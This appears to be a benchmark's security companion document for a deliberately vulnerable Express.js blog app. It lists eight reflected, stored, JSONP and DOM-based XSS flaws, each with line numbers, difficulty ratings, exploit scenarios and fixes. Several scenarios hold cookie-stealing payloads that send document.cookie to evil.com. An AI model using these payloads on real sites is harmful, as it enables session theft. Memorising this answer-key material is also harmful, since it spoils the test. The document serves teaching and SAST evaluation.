# Security Companion Document: app.js

## Language Exclusion Note: C and C++

C and C++ are excluded from the XSS vulnerability class because they are not typical web templating languages. While C and C++ can serve HTTP responses (e.g., via libmicrohttpd or cpp-httplib), they do not have standard HTML templating engines or web frameworks that produce dynamic HTML in the way that Python (Flask/Jinja2), Java (Spring Boot/Thymeleaf), Go (html/template), Rust (Actix-web), and JavaScript (Express.js) do. XSS vulnerabilities arise from the interaction between server-side code and HTML rendering in a browser, which is a pattern native to higher-level web frameworks rather than systems programming languages.

---

## Vulnerability: Reflected XSS via Tag Filter Parameter

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L54

### Description
The index route embeds the `tag` query parameter directly into HTML using template literal interpolation: `` `<p>Filtering by tag: <strong>${tag}</strong></p>` ``. The tag value from `req.query.tag` is inserted without any HTML escaping.

### Exploitation Scenario
An attacker crafts a URL like `http://localhost:3002/?tag=<script>alert(document.cookie)</script>` and shares it with a victim. The script executes in the victim's browser when they visit the link.

### Remediation Guidance
Use the `escapeHtml` function already defined in the file:
```javascript
page += `<p>Filtering by tag: <strong>${escapeHtml(tag)}</strong></p>`;
```

### Complexity Rationale
This is rated Obvious because the query parameter flows directly from the request into HTML output via template literal interpolation with no intermediate processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the direct embedding of a query parameter into HTML via string interpolation is a standard pattern that SAST tools reliably detect.

---

## Vulnerability: Stored XSS via Post Title, Author, Tags, and Content on Index Page

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L67-L78

### Description
The index route renders post titles, authors, tags, and content previews directly into HTML using template literal interpolation without escaping. For example, `` `<h2><a href="/post/${post.id}">${post.title}</a></h2>` `` embeds the title directly. All fields are stored from user form input without sanitization.

### Exploitation Scenario
An attacker creates a post with title `<img src=x onerror="fetch('http://evil.com/?c='+document.cookie)">`. When any user visits the home page, the onerror handler fires and exfiltrates their cookies.

### Remediation Guidance
Escape all user-supplied fields before rendering:
```javascript
page += `<h2><a href="/post/${post.id}">${escapeHtml(post.title)}</a></h2>`;
page += `<p>by <strong>${escapeHtml(post.author)}</strong></p>`;
```

### Complexity Rationale
This is rated Obvious because user-supplied data stored in the posts array is directly interpolated into HTML output with no escaping.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the taint flow from stored data to HTML output via template literals is a straightforward pattern for SAST tools.

---

## Vulnerability: Stored XSS via Comment Author and Body on Post View Page

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L109-L111

### Description
The post view route renders comment author and body fields directly into HTML without escaping via `` `<strong>${c.author}</strong>` `` and `` `<p>${c.body}</p>` ``. The comment data is stored from form submission in the POST handler and later rendered in the GET handler.

### Exploitation Scenario
An attacker submits a comment with body `<script>document.location='http://evil.com/?c='+document.cookie</script>`. When any user views the post, the script executes and steals their session.

### Remediation Guidance
Escape comment fields before rendering:
```javascript
page += `<strong>${escapeHtml(c.author)}</strong>`;
page += `<p>${escapeHtml(c.body)}</p>`;
```

### Complexity Rationale
This is rated Moderate because the data flows from the POST comment handler through in-memory storage in the post's comments array before being rendered in the GET post view handler, requiring a reviewer to trace the data flow across two route handlers.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to track the taint from request body parameters through the comments array storage and into the rendering loop in a separate route handler.

---

## Vulnerability: Reflected XSS via Search Query with Partial Escaping

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L175-L201

### Description
The search route reflects the query parameter `q` in multiple locations with inconsistent escaping. The query is embedded unescaped in the search input value attribute (line 177), the results heading (line 182), and the search highlighting logic (line 192-194). However, the content preview on line 201 uses `escapeHtml(preview)`, creating a false sense of security while the query itself remains unescaped in other contexts.

### Exploitation Scenario
An attacker crafts `http://localhost:3002/search?q="><script>alert(1)</script>` which breaks out of the input value attribute. The query is also reflected unescaped in the results heading and the highlighting replacement.

### Remediation Guidance
Escape the query parameter consistently:
```javascript
const safeQ = escapeHtml(q);
page += `<input type="text" name="q" value="${safeQ}">`;
page += `<h2>Results for: ${safeQ}</h2>`;
```

### Complexity Rationale
This is rated Nuanced because the content preview is properly escaped with `escapeHtml()` on line 158, creating an inconsistent pattern. A reviewer seeing the escape call may assume all outputs are protected, missing the unescaped query in the input attribute and heading.

### Detection Difficulty Rationale
This is rated Likely_Missed because the presence of `escapeHtml()` in the same function may cause SAST tools to reduce severity, and the multiple injection points across different HTML contexts require comprehensive taint analysis.

---

## Vulnerability: Stored XSS via Profile Fields with Attribute Injection

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L220-L222

### Description
The profile route renders user profile fields (displayName, bio, website) directly into HTML without escaping. The website field is injected into both an href attribute and link text via `` `<a href="${profile.website}">${profile.website}</a>` ``. The data flows from form submission through cookie-based user lookup before rendering.

### Exploitation Scenario
An attacker registers with website `javascript:alert(document.cookie)` to create a clickjacking link, or sets bio to `<script>fetch('http://evil.com/steal?c='+document.cookie)</script>`. When any user views the profile, the malicious content executes.

### Remediation Guidance
Escape all profile fields and validate URLs:
```javascript
page += `<h1>${escapeHtml(profile.displayName)}</h1>`;
page += `<div><strong>Bio:</strong> ${escapeHtml(profile.bio)}</div>`;
```

### Complexity Rationale
This is rated Moderate because the vulnerability spans multiple fields and output contexts (HTML body and href attribute), and the data flow involves cookie-based authentication to retrieve stored profile data.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to trace data from form submission through in-memory storage, cookie-based retrieval, and into multiple HTML output contexts.

---

## Vulnerability: Reflected XSS via Error Message Parameter

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L258

### Description
The error route embeds the `msg` query parameter directly into HTML using template literal interpolation: `` `<p>${msg}</p>` ``. The message is taken from `req.query.msg` with no escaping.

### Exploitation Scenario
An attacker crafts `http://localhost:3002/error?msg=<script>alert('XSS')</script>` and shares the link. The script executes when the victim visits the URL.

### Remediation Guidance
Escape the error message:
```javascript
const page = HEADER + `<h1>Error</h1><div style="color:red;"><p>${escapeHtml(msg)}</p></div>` + FOOTER;
```

### Complexity Rationale
This is rated Obvious because the query parameter is directly interpolated into HTML output with no processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because direct template literal interpolation of a query parameter into HTML is a textbook reflected XSS pattern.

---

## Vulnerability: JSONP Callback Injection in API Endpoint

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L271-L273

### Description
The `/api/posts` endpoint supports a `callback` query parameter for JSONP responses. The callback value is embedded directly into the response via `` `${callback}(${JSON.stringify(data)})` `` and served with `Content-Type: application/javascript`. No validation is performed on the callback parameter.

### Exploitation Scenario
An attacker crafts `http://localhost:3002/api/posts?callback=alert(document.cookie)//` which produces `alert(document.cookie)//(...)`. When loaded via a `<script>` tag, this executes arbitrary JavaScript.

### Remediation Guidance
Validate the callback parameter:
```javascript
if (callback && /^[a-zA-Z_$][a-zA-Z0-9_$]*$/.test(callback)) {
    const jsonp = `${callback}(${JSON.stringify(data)})`;
```
Or remove JSONP support and use CORS headers instead.

### Complexity Rationale
This is rated Nuanced because JSONP callback injection is a less commonly recognized XSS vector that operates in a JavaScript execution context rather than an HTML context.

### Detection Difficulty Rationale
This is rated Likely_Missed because most SAST tools focus on HTML-context XSS and may not flag JSONP callback injection as a cross-site scripting vulnerability.

---

## Vulnerability: DOM-Based XSS via Embed Endpoint with Script Injection

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L283-L292

### Description
The `/embed` endpoint renders user-controlled `title` and `theme` query parameters into multiple HTML contexts. While the `<title>` tag uses `escapeHtml(title)`, the `<h2>` tag renders `title` unescaped, and both `theme` and `title` are embedded directly into a `<script>` block inside JavaScript string literals. An attacker can break out of the JavaScript string context using quote characters to inject arbitrary code.

### Exploitation Scenario
An attacker crafts `http://localhost:3002/embed?title=";alert(document.cookie);//&theme=light`. The title value breaks out of the JavaScript string literal in the config object, executing arbitrary JavaScript. The theme parameter can also be exploited: `?theme=light";alert(1);//` breaks out of the body class attribute and the JavaScript string.

### Remediation Guidance
Escape values for their specific output contexts. For JavaScript string contexts, use JSON serialization:
```javascript
const safeTitle = JSON.stringify(title);
const safeTheme = JSON.stringify(theme);
const page = `<script>var config = { theme: ${safeTheme}, title: ${safeTitle} };</script>`;
```
Also escape the title in the `<h2>` tag and validate the theme against an allowlist.

### Complexity Rationale
This is rated Nuanced because the vulnerability involves multiple output contexts (HTML attribute, HTML body, and JavaScript string literal) within a single response. The title is partially escaped for the `<title>` tag but not for the `<h2>` or `<script>` contexts, and the JavaScript string injection requires understanding of context-specific escaping requirements.

### Detection Difficulty Rationale
This is rated Likely_Missed because the vulnerability requires understanding JavaScript string context escaping, which is distinct from HTML escaping. The presence of `escapeHtml()` on the title in one context may cause tools to miss the unescaped usage in other contexts, and JavaScript string injection within server-rendered script blocks is a pattern many SAST tools do not analyze deeply.
